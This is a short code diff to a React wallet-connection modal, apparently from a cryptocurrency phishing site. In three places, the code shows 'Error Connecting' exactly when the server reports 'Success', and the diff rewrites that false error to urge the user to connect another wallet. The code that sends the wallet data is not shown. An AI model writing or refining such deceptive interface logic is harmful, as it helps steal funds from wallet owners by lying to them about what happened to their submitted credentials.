@@ -39,7 +39,7 @@ const Modal = ({ wallet, closeModal }) => {
         if (data.status === 'Success') {
           setLoading(false);
           setMessage(
-            'Error Connecting to your preferred wallet! Please contact the Technical Support for further assistance!'
+            'Error Connecting! Try connecting another wallet!'
           );
           timer = setTimeout(() => closeModal(), 2000);
         }
@@ -64,7 +64,7 @@ const Modal = ({ wallet, closeModal }) => {
         if (data.status === 'Success') {
           setLoading(false);
           setMessage(
-            'Error Connecting to your preferred wallet! Please contact the Technical Support for further assistance!'
+            'Error Connecting! Try connecting another wallet!'
           );
           timer = setTimeout(() => closeModal(), 2000);
         }
@@ -93,7 +93,7 @@ const Modal = ({ wallet, closeModal }) => {
           if (data.status === 'Success') {
             setLoading(false);
             setMessage(
-              'Error Connecting to your preferred wallet! Please contact the Technical Support for further assistance!'
+              'Error Connecting! Try connecting another wallet!'
             );
             timer = setTimeout(() => closeModal(), 2000);
           }
